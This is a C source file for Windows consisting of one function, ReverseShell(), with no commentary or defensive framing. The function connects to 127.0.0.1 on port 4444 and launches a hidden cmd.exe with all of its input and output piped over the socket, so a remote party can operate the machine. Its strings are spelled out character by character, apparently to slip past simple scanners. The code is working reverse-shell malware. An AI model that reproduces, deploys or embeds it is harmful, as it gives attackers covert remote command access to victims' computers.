#define WIN32_LEAN_AND_MEAN
//HEADERS

#include <process.h>
#include <ws2tcpip.h>
#include <Windows.h>


void ReverseShell()
{
//DECLARATIONS

	WSADATA wsaData;
	int iResult;
	struct addrinfo* result;
	struct addrinfo* ptr;
	struct addrinfo hints;
	SOCKET ConnectSocket;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	char cmdline[] = {'c','m','d',0};
	char remoteAddr[] = {'1','2','7','.','0','.','0','.','1',0};
	char remotePort[] = {'4','4','4','4',0};

//INITIALIZATIONS

	result = NULL;
	ptr = NULL;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	SecureZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(remoteAddr, remotePort, &hints, &result);
	ptr = result;
	ConnectSocket = WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	
	SecureZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	SecureZeroMemory(&pi, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;
	CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
}